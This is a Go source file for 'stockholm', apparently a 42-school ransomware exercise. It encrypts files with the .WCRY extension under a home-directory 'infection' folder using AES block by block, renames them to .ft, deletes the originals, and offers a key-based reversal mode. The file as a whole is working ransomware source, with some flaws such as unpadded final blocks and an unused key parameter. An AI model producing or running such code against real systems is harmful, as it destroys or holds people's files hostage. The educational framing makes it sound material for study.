package main

import (
	// Using AES because it's enough for a POC, it's in the standard lib, and fast
	// but it can be bruteforced easily
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"

	"github.com/akamensky/argparse"
)

const (
	Version = "1.0.0"

	WANNACRY_EXT  = ".WCRY"
	STOCKHOLM_EXT = ".ft"
)

var (
	InfectionPath, err = os.UserHomeDir()

	// Crypto stuff
	CRYPTO_PROVIDER = rand.Reader
	CRYPTO_KEY_SIZE = 32
	RANDOM_KEY      = make([]byte, CRYPTO_KEY_SIZE)
	CIPHER_BLOCK    = 16
	CIPHER          cipher.Block

	// Flags
	FlagVersion *bool
	ReverseKey  *string
	FlagSilent  *bool
)

func VerboseLog(prefix string, args ...interface{}) {
	if !*FlagSilent {
		fmt.Printf("[%s] ", prefix)
		fmt.Println(args...)
	}
}

func init() {
	if err != nil {
		fmt.Println("Failed to get user home directory:", err)
		os.Exit(1)
	} else {
		InfectionPath = filepath.Join(InfectionPath, "infection")
	}
	args := argparse.NewParser("stockholm", "A very friendly program (not really)")
	FlagVersion = args.Flag("v", "version", &argparse.Options{Required: false, Help: "Shows the version of the program"})
	ReverseKey = args.String("r", "reverse", &argparse.Options{Required: false, Help: "Reverse the infection using the provided encryption key"})
	FlagSilent = args.Flag("s", "silent", &argparse.Options{Required: false, Help: "Silent mode, no output"})
	if err := args.Parse(os.Args); err != nil {
		fmt.Print(args.Usage(err))
		os.Exit(1)
	}
	if *FlagVersion {
		fmt.Println("42 stockholm, version: " + Version)
		os.Exit(0)
	}

	if len(*ReverseKey) == 0 {
		// Create a random key
		_, err := io.ReadFull(CRYPTO_PROVIDER, RANDOM_KEY)
		if err != nil {
			VerboseLog("-", "Failed to generate random key:", err)
			os.Exit(1)
		}
	} else {
		// Load the key passed as argument, must be hex string 64 chars long
		if len(*ReverseKey) != 64 {
			VerboseLog("-", "Invalid key length, must be 64 chars long")
			os.Exit(1)
		}
		_, err := fmt.Sscanf(*ReverseKey, "%x", &RANDOM_KEY)
		if err != nil {
			VerboseLog("-", "Failed to parse key:", err)
			os.Exit(1)
		}
	}
	CIPHER, err = aes.NewCipher(RANDOM_KEY)
	if err != nil {
		VerboseLog("-", "Failed to create cipher:", err)
		os.Exit(1)
	}
}

func prepareFileOperation(path string) (inputFile, outputFile *os.File, err error) {
	// Open input file
	inputFile, err = os.OpenFile(path, os.O_RDONLY, 0644)
	if err != nil {
		VerboseLog("-", "Failed to open file:", err)
		return nil, nil, err
	}

	// Create output file, same path but append a .tmp extension, truncate if exists
	outputFile, err = os.OpenFile(path+".tmp", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		VerboseLog("-", "Failed to create output file:", path+".tmp", err)
		inputFile.Close() // don't forget to close the input file :^)
		return nil, nil, err
	}

	return inputFile, outputFile, nil
}

func CryptFile(path string, key []byte) {
	VerboseLog("+", "Encrypting file:", path)
	inputFile, outputFile, err := prepareFileOperation(path)
	if err != nil {
		return // error already logged
	}
	buffer := make([]byte, CIPHER_BLOCK)
	for {
		_, err := inputFile.Read(buffer)
		if err != nil {
			if err != io.EOF {
				VerboseLog("-", "Failed to read file:", err)
			}
			break
		}
		// Cipher the buffer
		CIPHER.Encrypt(buffer, buffer)
		// Write to output file
		_, err = outputFile.Write(buffer)
		if err != nil {
			VerboseLog("-", "Failed to write to output file:", err)
			break
		}
	}
	// Close files
	inputFile.Close()
	outputFile.Close()

	// Rename output file to input file and delete input file
	err = os.Rename(path+".tmp", path+STOCKHOLM_EXT)
	if err != nil {
		VerboseLog("-", "Failed to rename output file:", err)
		return
	}

	err = os.Remove(path)
	if err != nil {
		VerboseLog("-", "Failed to remove input file:", err)
		return
	}
}

func DecryptFile(path string, key []byte) {
	VerboseLog("+", "Decrypting file:", path)
	inputFile, outputFile, err := prepareFileOperation(path)
	if err != nil {
		return // error already logged
	}
	buffer := make([]byte, CIPHER_BLOCK)
	for {
		_, err := inputFile.Read(buffer)
		if err != nil {
			if err != io.EOF {
				VerboseLog("-", "Failed to read file:", err)
			}
			break
		}
		// Cipher the buffer
		CIPHER.Decrypt(buffer, buffer)
		// Write to output file
		_, err = outputFile.Write(buffer)
		if err != nil {
			VerboseLog("-", "Failed to write to output file:", err)
			break
		}
	}
	// Close files
	inputFile.Close()
	outputFile.Close()

	// Rename output file to input file and delete input file
	err = os.Rename(path+".tmp", path[:len(path)-len(STOCKHOLM_EXT)])
	if err != nil {
		VerboseLog("-", "Failed to rename output file:", err)
		return
	}

	err = os.Remove(path)
	if err != nil {
		VerboseLog("-", "Failed to remove input file:", err)
		return
	}
}

// IterFiles iterates over all files in the system with the provided extension, and calls the provided function
// it doesn't stop on error, but logs them if the 'silent' flag is not set.
func IterFiles(extension string, action func(string, []byte), key []byte) {
	VerboseLog("#", "Iterating over files in", InfectionPath)
	if _, err := os.Stat(InfectionPath); os.IsNotExist(err) {
		VerboseLog("-", "Infection directory does not exist.")
		return
	}
	err := filepath.Walk(InfectionPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			VerboseLog("-", "Failed to iterate over files:", err)
			return nil
		}
		// Directory, skip
		if info.IsDir() {
			return nil
		}
		// Check extension
		if filepath.Ext(path) == extension {
			// The action function must log whether the action was successful or not
			action(path, key)
		}
		return nil
	})
	if err != nil {
		VerboseLog("-", "Failed to iterate over files:", err)
	}
}

func main() {
	if *ReverseKey != "" {
		VerboseLog("#", "Reversing infection with key:", *ReverseKey)
		IterFiles(STOCKHOLM_EXT, DecryptFile, []byte(*ReverseKey))
	} else {
		VerboseLog("#", "Infecting system")
		IterFiles(WANNACRY_EXT, CryptFile, []byte("42")) // hardcoded key for testing
	}
	VerboseLog("+", "Done!")
	VerboseLog("!", "Key used:", fmt.Sprintf("%x", RANDOM_KEY))
}
